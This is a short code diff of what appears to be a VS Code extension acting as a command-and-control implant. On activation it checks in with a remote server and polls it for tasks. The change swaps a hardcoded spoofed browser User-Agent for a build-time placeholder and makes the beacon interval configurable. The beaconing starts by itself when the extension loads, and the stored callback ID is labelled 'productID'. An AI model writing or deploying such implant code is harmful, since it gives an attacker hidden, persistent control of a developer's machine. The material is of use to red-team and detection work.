@@ -16,7 +16,7 @@ const client = axios.create({
 	timeout: 1000,
 	headers: {
 		'Accept': 'application/json',
-		'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'
+		'User-Agent': 'USER_AGENT'
 	}
 });
 
@@ -121,12 +121,14 @@ function postTaskResponse(uuid, taskID, output) {
  */
 function activate(context) {
 	const callbackUUID = context.globalState.get('productID')
+	// Build parameter is in seconds, setInterval() wants milliseconds
+	const interval = callback_interval * 1000
 
 	if (callbackUUID != null) {
-		setInterval(getTasking, 5000, context);
+		setInterval(getTasking, interval, context);
 	} else {
 		checkIn(context);
-		setInterval(getTasking, 5000, context);
+		setInterval(getTasking, interval, context);
 	}
 }
 
